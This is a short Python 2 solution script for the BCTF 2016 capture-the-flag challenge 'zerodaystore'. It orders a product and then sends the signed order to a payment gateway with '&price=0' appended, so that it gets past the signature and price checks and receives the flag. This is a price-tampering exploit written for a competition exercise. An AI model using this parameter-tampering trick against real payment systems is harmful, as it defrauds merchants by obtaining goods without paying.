#!/usr/bin/env python2
#
# BCTF 2016
# zerodaystore (MISC/200)
#
# @a: Smoke Leet Everyday
# @u: https://github.com/smokeleeteveryday
#

import json
import requests

def order(target, product_id, price, android_id):
	data = {'productID': product_id, 'price': price, 'androidID': android_id}
	r = requests.post(target + '/order', data = json.dumps(data))
	if (r.status_code == 200):
		return r.text
	else:
		return None

def pay(target, orderStr):
	r = requests.post(target + '/pay', data = orderStr)
	if (r.status_code == 200):
		return r.text
	else:
		return None
	return

order_url = 'http://mall.godric.me'
pay_url = 'http://paygate.godric.me'

product_id = 4
price = 1
android_id = '1'

response = order(order_url, product_id, price, android_id)
if (response != None):
	data = json.loads(response)
	if (data['status'] == 1):
		order_data = data['data']
		response = pay(pay_url, order_data + "&price=0")
		if (response != None):
			data = json.loads(response)
			if (data['status'] == 2):
				print "[-] Invalid payment signature..."
			elif (data['status'] == 3):
				print "[-] Invalid price (> 0)..."
			elif (data['status'] == 4):
				print "[+] Got flag: [%s]" % data['data']
			else:
				print "[-] Payment request failed (invalid status)"
		else:
			print "[-] Payment request failed (invalid HTTP response code)"
	else:
		print "[-] Order request failed (invalid status)"
else:
	print "[-] Order request failed (invalid HTTP response code)"